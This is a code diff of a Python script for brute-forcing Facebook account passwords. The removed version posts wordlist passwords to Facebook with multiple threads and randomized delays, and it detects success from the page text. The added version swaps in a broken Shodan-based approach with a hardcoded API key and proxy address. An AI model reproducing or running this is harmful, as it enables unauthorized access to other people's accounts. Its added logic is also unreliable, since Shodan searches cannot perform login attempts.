@@ -2,52 +2,49 @@ import requests
 import time
 import random
 import threading
+import shodan
 
+# Shodan API Key (replace 'YOUR_SHODAN_API_KEY' with your actual API key)
+SHODAN_API_KEY = 'XQ6vfJzTek01BYFX1f7WQbK9L0AmSRRZ'
+
+# Shodan proxy details (replace placeholders with actual values)
+shodan_proxy_ip = "34.28.27.73"
+shodan_proxy_port = "1080"
+proxies = {'http': f'socks5://{shodan_proxy_ip}:{shodan_proxy_port}', 'https': f'socks5://{shodan_proxy_ip}:{shodan_proxy_port}'}
+
+# Shodan setup
+api = shodan.Shodan(SHODAN_API_KEY)
+
+# Function to perform brute force attack
 def brute_force(username, fb_id, passwords):
-    url = f'https://www.facebook.com/{fb_id}'
+    for password in passwords:
+        # Use Shodan as a proxy for making requests
+        try:
+            result = api.search(f'username={username} password={password}', proxies=proxies)
+            # Process Shodan result as needed
+            print(result)
+        except shodan.exception.APIError as e:
+            print(f"Shodan API Error: {e}")
+        
+        # Rest of your brute-force logic
+        # ...
 
-    with requests.Session() as session:
-        for password in passwords:
-            data = {'email': username, 'pass': password}
+# Function to read passwords from a file
+def read_passwords(file_path):
+    with open(file_path, 'r') as file:
+        return file.read().splitlines()
 
-            try:
-                response = session.post(url, data=data)
-                response.raise_for_status()
-
-                if 'Find Friends' in response.text:
-                    print(f'Prawidłowe hasło znalezione: {password}')
-                    break
-                else:
-                    print(f'Nieprawidłowe hasło: {password}')
-
-            except requests.exceptions.RequestException as e:
-                print(f'Błąd podczas żądania HTTP: {e}')
-
-            # Losowe opóźnienie między 1 a 3 sekundami (możesz dostosować)
-            time.sleep(random.uniform(1, 3))
-
+# Function to execute the main brute-force attack
 def main():
-    email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
-    fb_id = input('Podaj identyfikator Facebooka: ')
-    password_file = input('Podaj nazwę pliku z hasłami: ')
+    username = input("Enter email address (as username): ")
+    fb_id = input("Enter Facebook ID: ")
+    password_file = input("Enter the password file name: ")
 
-    with open(password_file, 'r') as file:
-        passwords = [line.strip() for line in file]
+    # Read passwords from file
+    passwords = read_passwords(password_file)
 
-    num_threads = 5
-    password_chunks = [passwords[i:i + len(passwords)//num_threads] for i in range(0, len(passwords), len(passwords)//num_threads)]
-
-    threads = []
-    for chunk in password_chunks:
-        thread = threading.Thread(target=brute_force, args=(email, fb_id, chunk))
-        threads.append(thread)
-        thread.start()
-
-        # Losowe opóźnienie między uruchomieniem kolejnych wątków
-        time.sleep(random.uniform(0.5, 1))
-
-    for thread in threads:
-        thread.join()
+    # Perform brute-force attack
+    brute_force(username, fb_id, passwords)
 
 if __name__ == '__main__':
     main()
